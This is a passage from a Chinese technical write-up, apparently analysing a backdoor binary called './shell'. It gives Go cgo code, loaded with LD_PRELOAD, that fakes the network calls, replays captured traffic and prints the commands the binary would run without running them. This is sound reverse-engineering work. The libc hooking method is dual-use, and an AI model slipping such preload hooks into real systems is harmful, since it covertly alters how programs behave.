  第一次调用时写入 0x46209534
  偶数次调用时写入接下来数据的长度(大端)
  奇数次调用时向 buf 中写入 n 长度的数据，为收集的 16 进制转字节数组的结果
}

FILE *popen(const char *command, const char *modes) {
  打印 command，return NULL
}

ssize_t send(int fd, const void *buf, size_t n, int flags) {
  return n
}
```

我用 `go` 语言的 `cgo` 机制实现了上述 `hook`

```go
package main

/*
typedef unsigned short int sa_family_t;
typedef unsigned int socklen_t;
typedef long ssize_t;
typedef unsigned long size_t;
typedef struct _IO_FILE FILE;
struct sockaddr {
  sa_family_t sa_family;
  char sa_data[14];
};
*/
import "C"
import (
	"encoding/hex"
	"fmt"
	"unsafe"
)

func main() {}

//export connect
func connect(fd C.int, addr *C.struct_sockaddr, len C.socklen_t) C.int {
	return C.int(1)
}

var datas = []string{
	......
}

var count = -1

//export recv
func recv(fd C.int, buf unsafe.Pointer, n C.size_t, flags C.int) C.ssize_t {
	if count/2 >= len(datas) {
		return 0
	}
	if count == -1 {
		*(*C.uint)(buf) = C.uint(0x46209534)
	} else if count%2 == 0 {
		size := uint32(len(datas[count/2]))
		size = 0 |
			((size & 0xFF000000) >> 24) |
			((size & 0x00FF0000) >> 8) |
			((size & 0x0000FF00) << 8) |
			((size & 0x000000FF) << 24)
		*(*C.uint)(buf) = C.uint(size)
	} else {
		data, err := hex.DecodeString(datas[count/2])
		if err != nil {
			panic(err)
		}
		copy(unsafe.Slice((*byte)(buf), n), data)
	}
	count++
	return C.ssize_t(n)
}

//export popen
func popen(command *C.char, modes *C.char) *C.FILE {
	fmt.Println(C.GoString(command))
	return nil
}

//export send
func send(fd C.int, buf unsafe.Pointer, n C.size_t, flags C.int) C.ssize_t {
	return C.ssize_t(n)
}
```

然后编译为动态链接库：

```sh
go build -buildmode=c-shared -o hook.so .
```

最后在执行 `./shell` 之前加载动态库

```sh
LD_PRELOAD=./hook.so ./shell
```

然后就能看到和法一差不多的结果。
